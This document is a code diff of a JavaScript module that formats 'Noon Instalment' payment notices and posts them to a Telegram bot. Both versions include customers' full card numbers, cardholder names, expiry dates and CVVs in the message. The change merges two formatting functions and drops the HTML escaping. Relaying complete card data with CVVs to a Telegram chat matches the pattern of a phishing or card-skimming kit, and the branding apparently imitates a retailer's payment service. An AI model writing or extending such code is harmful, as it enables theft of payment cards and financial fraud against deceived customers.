@@ -5,18 +5,6 @@ function clip(value, max = 120) {
     .slice(0, max);
 }
 
-function escapeHtml(value) {
-  return String(value ?? "")
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;");
-}
-
-function htmlCode(value, max = 120) {
-  const safe = escapeHtml(clip(value, max));
-  return safe ? `<code>${safe}</code>` : "";
-}
-
 function amount(value) {
   const number = Number(value);
   if (!Number.isFinite(number)) return "0.00";
@@ -26,8 +14,8 @@ function amount(value) {
   });
 }
 
-function buildPlainNotice(payload, monthly, title) {
-  return [
+function buildNotice(payload, monthly, title, isCard) {
+  const lines = [
     title,
     `Customer: ${clip(payload.name)}`,
     `Code: ${clip(payload.customerCode, 32)}`,
@@ -40,58 +28,31 @@ function buildPlainNotice(payload, monthly, title) {
     `Monthly: SAR ${amount(payload.monthlyAmount)}`,
     `Plan: ${clip(payload.duration, 8)} months`,
     payload.note ? `Note: ${clip(payload.note, 160)}` : "",
-  ]
-    .filter(Boolean)
-    .join("\n");
-}
+  ];
 
-function buildCardNotice(payload, monthly, title) {
-  const lines = [
-    `<b>${escapeHtml(title)}</b>`,
-    `Customer: ${htmlCode(payload.name)}`,
-    `Code: ${htmlCode(payload.customerCode, 32)}`,
-    `Phone: ${htmlCode(payload.phone, 32)}`,
-    monthly
-      ? `Instalment: SAR ${amount(payload.downPayment)}`
-      : `Down payment: SAR ${amount(payload.downPayment)}`,
-    `Total: SAR ${amount(payload.totalPrice)}`,
-    `Remaining: SAR ${amount(payload.remainingAmount)}`,
-    `Monthly: SAR ${amount(payload.monthlyAmount)}`,
-    `Plan: ${htmlCode(payload.duration, 8)} months`,
-    payload.note ? `Note: ${escapeHtml(clip(payload.note, 160))}` : "",
-  ].filter(Boolean);
+  const body = lines.filter(Boolean);
 
-  const cardLines = [
-    payload.cardholderName &&
-      `Cardholder: ${htmlCode(payload.cardholderName, 80)}`,
-    payload.cardNumber && `Card number: ${htmlCode(payload.cardNumber, 24)}`,
-    payload.cardExpiry && `Expiry: ${htmlCode(payload.cardExpiry, 8)}`,
-    payload.cardCvv && `CVV: ${htmlCode(payload.cardCvv, 6)}`,
-  ].filter(Boolean);
-
-  if (cardLines.length) {
-    lines.push("");
-    lines.push("<b>Card details</b> (tap a line to copy)");
-    lines.push(...cardLines);
-
-    const copyBlock = [
-      payload.cardholderName &&
-        `Cardholder: ${clip(payload.cardholderName, 80)}`,
-      payload.cardNumber && `Card number: ${clip(payload.cardNumber, 24)}`,
-      payload.cardExpiry && `Expiry: ${clip(payload.cardExpiry, 8)}`,
-      payload.cardCvv && `CVV: ${clip(payload.cardCvv, 6)}`,
-    ]
-      .filter(Boolean)
-      .join("\n");
-
-    if (copyBlock) {
-      lines.push("");
-      lines.push("<b>Copy all</b>");
-      lines.push(`<pre>${escapeHtml(copyBlock)}</pre>`);
+  if (isCard) {
+    const card = ["Card details"];
+    if (payload.cardholderName) {
+      card.push(`Cardholder: ${clip(payload.cardholderName, 80)}`);
+    }
+    if (payload.cardNumber) {
+      card.push(`Card number: ${clip(payload.cardNumber, 24)}`);
+    }
+    if (payload.cardExpiry) {
+      card.push(`Expiry: ${clip(payload.cardExpiry, 8)}`);
+    }
+    if (payload.cardCvv) {
+      card.push(`CVV: ${clip(payload.cardCvv, 6)}`);
+    }
+    if (card.length > 1) {
+      body.push("");
+      body.push(...card);
     }
   }
 
-  return lines.join("\n");
+  return body.join("\n");
 }
 
 export async function sendDownPaymentNotice(payload) {
@@ -114,25 +75,18 @@ export async function sendDownPaymentNotice(payload) {
       ? "Noon Instalment — Monthly payment"
       : "Noon Instalment — Down payment";
 
-  const text = isCard
-    ? buildCardNotice(payload, monthly, title)
-    : buildPlainNotice(payload, monthly, title);
-
-  const body = {
-    chat_id: chatId,
-    text,
-    disable_web_page_preview: true,
-  };
-  if (isCard) {
-    body.parse_mode = "HTML";
-  }
+  const text = buildNotice(payload, monthly, title, isCard);
 
   const response = await fetch(
     `https://api.telegram.org/bot${token}/sendMessage`,
     {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body),
+      body: JSON.stringify({
+        chat_id: chatId,
+        text,
+        disable_web_page_preview: true,
+      }),
     }
   );
 
